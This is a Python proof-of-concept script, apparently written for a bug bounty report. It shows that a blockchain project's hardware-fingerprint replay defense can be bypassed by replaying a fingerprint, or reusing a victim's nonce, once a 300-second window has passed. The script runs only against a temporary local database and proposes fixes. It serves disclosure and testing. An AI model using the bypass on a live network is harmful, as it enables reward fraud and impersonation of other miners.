#!/usr/bin/env python3
"""
PoC: Time-Window Bypass in Replay Defense (Issue #2783)
========================================================

This PoC demonstrates that the replay defense can be bypassed by waiting
for the 300-second window to expire, then replaying a captured fingerprint.

Attack Steps:
1. Submit a valid fingerprint at T=0
2. Wait 301 seconds (or manipulate time in test)
3. Replay the same fingerprint with a new nonce at T=301
4. Replay defense fails to detect it (submitted_at > window_start filters out old record)

Impact:
- Unlimited reward farming with single hardware device
- Sybil-like attacks using replayed fingerprints
- No additional hardware required

Fix:
- Remove temporal constraint from conflict check
- Check against ENTIRE history, not just last 5 minutes
- Use UNIQUE constraint on (fingerprint_hash, nonce) at DB level
"""

import sqlite3
import tempfile
import os
import sys
import time

# Add node directory to path
sys.path.insert(0, '/tmp/rustchain-bounty/node')

# Mock the DB path to use a temp file
TEMP_DB = tempfile.NamedTemporaryFile(suffix='.db', delete=False).name
os.environ['RUSTCHAIN_DB_PATH'] = TEMP_DB

# Import after setting DB path
from hardware_fingerprint_replay import (
    init_replay_defense_schema,
    check_fingerprint_replay,
    record_fingerprint_submission,
    compute_fingerprint_hash,
    REPLAY_WINDOW_SECONDS
)


def setup():
    """Initialize test database."""
    init_replay_defense_schema()
    print(f"[+] Using temp DB: {TEMP_DB}")
    print(f"[+] Replay window: {REPLAY_WINDOW_SECONDS}s")


def simulate_time_advance(seconds):
    """
    Simulate time passing by directly modifying submitted_at in DB.
    In real attack, attacker would just wait 301+ seconds.
    """
    with sqlite3.connect(TEMP_DB) as conn:
        conn.execute(
            "UPDATE fingerprint_submissions SET submitted_at = submitted_at - ?",
            (seconds,)
        )
        conn.commit()
    print(f"[+] Simulated {seconds}s time advance")


def test_time_window_bypass():
    """
    Demonstrate the time-window bypass vulnerability.
    """
    print("\n" + "=" * 70)
    print("PoC: Time-Window Bypass in Replay Defense")
    print("=" * 70)
    
    # Step 1: Submit initial fingerprint
    print("\n[Step 1] Submit initial fingerprint...")
    fingerprint = {
        'checks': {
            'clock_drift': {'passed': True, 'data': {'cv': 0.01, 'drift_hash': 'abc123'}},
            'cache_timing': {'passed': True, 'data': {'cache_hash': 'def456', 'L1': 100, 'L2': 200}},
            'thermal_drift': {'passed': True, 'data': {'ratio': 0.5}},
            'instruction_jitter': {'passed': True, 'data': {'cv': 0.02, 'jitter_map': {}}},
            'simd_identity': {'passed': True, 'data': {}},
        },
        'timestamp': int(time.time()),
        'bridge_type': 'usb'
    }
    
    nonce_1 = "nonce_original_001"
    wallet = "RTC_test_wallet_001"
    miner = "miner_001"
    
    record_fingerprint_submission(fingerprint, nonce_1, wallet, miner)
    fp_hash = compute_fingerprint_hash(fingerprint)
    print(f"  Fingerprint hash: {fp_hash[:16]}...")
    print(f"  Nonce: {nonce_1}")
    print(f"  Wallet: {wallet}")
    
    # Step 2: Verify replay detection works within window
    print("\n[Step 2] Verify replay detection within window...")
    nonce_2 = "nonce_different_002"
    is_replay, reason, details = check_fingerprint_replay(fp_hash, nonce_2, wallet, miner)
    
    if is_replay:
        print(f"  ✅ Replay detected (within window): {reason}")
        print(f"  Details: {details}")
    else:
        print(f"  ❌ Replay NOT detected (unexpected)")
        return False
    
    # Step 3: Simulate time passing (301 seconds)
    print(f"\n[Step 3] Simulating {REPLAY_WINDOW_SECONDS + 1}s time passage...")
    simulate_time_advance(REPLAY_WINDOW_SECONDS + 1)
    
    # Step 4: Replay the same fingerprint with new nonce
    print("\n[Step 4] Replay fingerprint after window expired...")
    nonce_3 = "nonce_replay_003"
    is_replay, reason, details = check_fingerprint_replay(fp_hash, nonce_3, wallet, miner)
    
    if is_replay:
        print(f"  ✅ Replay detected (after window): {reason}")
        print(f"  [FIXED] Vulnerability has been patched!")
        return True
    else:
        print(f"  ❌ VULNERABILITY CONFIRMED!")
        print(f"  Replay NOT detected after window expired!")
        print(f"  Reason: {reason}")
        print(f"\n  ⚠️  Attacker can now replay fingerprints indefinitely!")
        print(f"  ⚠️  Each replay earns rewards without additional hardware!")
        return False


def test_nonce_reuse_bypass():
    """
    Demonstrate nonce reuse bypass after window expiration.
    """
    print("\n" + "=" * 70)
    print("PoC: Nonce Reuse Bypass After Window Expiration")
    print("=" * 70)
    
    # Step 1: Submit with nonce
    print("\n[Step 1] Submit fingerprint with nonce...")
    fingerprint = {
        'checks': {
            'clock_drift': {'passed': True, 'data': {'cv': 0.05, 'drift_hash': 'xyz789'}},
            'cache_timing': {'passed': True, 'data': {'cache_hash': 'uvw456', 'L1': 150, 'L2': 250}},
            'thermal_drift': {'passed': True, 'data': {'ratio': 0.7}},
            'instruction_jitter': {'passed': True, 'data': {'cv': 0.03, 'jitter_map': {}}},
            'simd_identity': {'passed': True, 'data': {}},
        },
        'timestamp': int(time.time()),
        'bridge_type': 'pci'
    }
    
    nonce = "nonce_shared_001"
    wallet_a = "RTC_attacker_wallet"
    wallet_b = "RTC_victim_wallet"
    miner = "miner_002"
    
    record_fingerprint_submission(fingerprint, nonce, wallet_b, miner)
    fp_hash = compute_fingerprint_hash(fingerprint)
    print(f"  Victim submitted with nonce: {nonce}")
    
    # Step 2: Verify nonce collision detection within window
    print("\n[Step 2] Verify nonce collision detection within window...")
    is_replay, reason, details = check_fingerprint_replay(fp_hash, nonce, wallet_a, miner)
    
    if is_replay:
        print(f"  ✅ Nonce collision detected: {reason}")
        print(f"  Details: {details}")
    else:
        print(f"  ❌ Nonce collision NOT detected (unexpected)")
        return False
    
    # Step 3: Simulate time passing
    print(f"\n[Step 3] Simulating {REPLAY_WINDOW_SECONDS + 1}s time passage...")
    simulate_time_advance(REPLAY_WINDOW_SECONDS + 1)
    
    # Step 4: Attacker reuses same nonce
    print("\n[Step 4] Attacker reuses victim's nonce after window expired...")
    is_replay, reason, details = check_fingerprint_replay(fp_hash, nonce, wallet_a, miner)
    
    if is_replay:
        print(f"  ✅ Nonce collision detected: {reason}")
        print(f"  [FIXED] Vulnerability has been patched!")
        return True
    else:
        print(f"  ❌ VULNERABILITY CONFIRMED!")
        print(f"  Nonce collision NOT detected after window expired!")
        print(f"  Reason: {reason}")
        print(f"\n  ⚠️  Attacker can impersonate victim using their nonce!")
        return False


def main():
    """Run all PoC tests."""
    print("\n" + "=" * 70)
    print("Rustchain Replay Defense Time-Window Bypass PoC")
    print("Issue: #2783 | Severity: Critical | Bounty: #2867")
    print("=" * 70)
    
    setup()
    
    # Run tests
    test1_passed = test_time_window_bypass()
    test2_passed = test_nonce_reuse_bypass()
    
    # Summary
    print("\n" + "=" * 70)
    print("PoC Summary")
    print("=" * 70)
    print(f"  Time-Window Bypass: {'✅ FIXED' if test1_passed else '❌ VULNERABLE'}")
    print(f"  Nonce Reuse Bypass: {'✅ FIXED' if test2_passed else '❌ VULNERABLE'}")
    
    if not test1_passed or not test2_passed:
        print("\n  ⚠️  CRITICAL VULNERABILITIES DETECTED!")
        print("  Attackers can bypass replay defense by waiting 301+ seconds.")
        print("  This enables unlimited reward farming with single hardware.")
        print("\n  Fix: Remove temporal constraint from conflict check.")
        print("  Check against ENTIRE history, not just last 5 minutes.")
    else:
        print("\n  ✅ All vulnerabilities have been patched!")
    
    # Cleanup
    os.unlink(TEMP_DB)
    
    return 0 if (test1_passed and test2_passed) else 1


if __name__ == "__main__":
    sys.exit(main())
